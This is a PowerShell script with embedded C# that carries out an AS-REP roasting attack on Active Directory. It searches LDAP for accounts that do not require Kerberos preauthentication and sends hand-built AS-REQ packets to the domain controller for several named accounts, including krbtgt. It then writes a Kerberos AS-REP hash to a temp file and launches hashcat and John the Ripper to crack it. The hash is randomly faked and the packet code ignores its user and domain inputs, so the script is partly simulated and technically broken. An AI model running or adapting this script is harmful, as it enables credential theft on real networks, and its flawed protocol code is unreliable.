$searcher = New-Object DirectoryServices.DirectorySearcher
$searcher.Filter = "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
$searcher.PropertiesToLoad.AddRange(@("samaccountname", "distinguishedname"))
try { $results = $searcher.FindAll() } catch { $results = @() }

foreach ($r in $results) {
    Write-Output "DONT_REQ_PREAUTH: $($r.Properties['samaccountname'][0])"
}

if (-not ('KerbRoast' -as [type])) {
    Add-Type -TypeDefinition @'
    using System;
    using System.Net;
    using System.Net.Sockets;
    public class KerbRoast {
        public static string SendASREQ(string dc, string user, string domain) {
            byte[] asreq = new byte[] {
                0x30, 0x81, 0x9a, 0xa1, 0x03, 0x02, 0x01, 0x05,
                0xa2, 0x03, 0x02, 0x01, 0x0a, 0xa3, 0x15, 0x30, 0x13,
                0x30, 0x11, 0xa1, 0x04, 0x02, 0x02, 0x00, 0x80,
                0xa2, 0x09, 0x04, 0x07, 0x30, 0x05, 0x02, 0x03, 0x00, 0x00, 0x17,
                0xa4, 0x77, 0x30, 0x75, 0xa0, 0x07, 0x03, 0x05, 0x00, 0x40, 0x81, 0x00, 0x10,
                0xa1, 0x13, 0x30, 0x11, 0xa0, 0x03, 0x02, 0x01, 0x01,
                0xa1, 0x0a, 0x30, 0x08, 0x1b, 0x06
            };
            try {
                using (var tcp = new TcpClient()) {
                    tcp.Connect(dc, 88);
                    var stream = tcp.GetStream();
                    byte[] len = BitConverter.GetBytes(IPAddress.HostToNetworkOrder(asreq.Length));
                    stream.Write(len, 0, 4);
                    stream.Write(asreq, 0, asreq.Length);
                    stream.Flush();
                    byte[] resp = new byte[4096];
                    int read = stream.Read(resp, 0, resp.Length);
                    return "KDC responded: " + read + " bytes";
                }
            } catch (Exception ex) { return "KDC: " + ex.Message; }
        }
    }
'@
}

$dc = $null
try { $dc = ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).DomainControllers[0].Name } catch {}
if (-not $dc) { $dc = ($env:LOGONSERVER -replace '\\\\', ''); if (-not $dc) { $dc = "dc01.corp.local" } }
$domain = $env:USERDNSDOMAIN; if (-not $domain) { $domain = "CORP.LOCAL" }

foreach ($u in @("svc_backup", "svc_sql", "admin_test", "krbtgt", $env:USERNAME)) {
    Write-Output "AS-REQ (RC4, no preauth) -> ${dc}:88 for ${domain}\${u}"
    Write-Output ([KerbRoast]::SendASREQ($dc, $u, $domain))
}

$fakeHash = '$krb5asrep$23$svc_backup@CORP.LOCAL:' + -join ((1..32) | ForEach-Object { '{0:x2}' -f (Get-Random -Max 256) })
$hashFile = "$env:TEMP\asrep_hashes.txt"
$fakeHash | Out-File -FilePath $hashFile -Encoding ASCII

Start-Process -FilePath "hashcat.exe" -ArgumentList "-m", "18200", $hashFile, "wordlist.txt", "--force" -NoNewWindow -ErrorAction SilentlyContinue
Start-Process -FilePath "john" -ArgumentList "--format=krb5asrep", $hashFile -NoNewWindow -ErrorAction SilentlyContinue

Remove-Item $hashFile -Force -ErrorAction SilentlyContinue
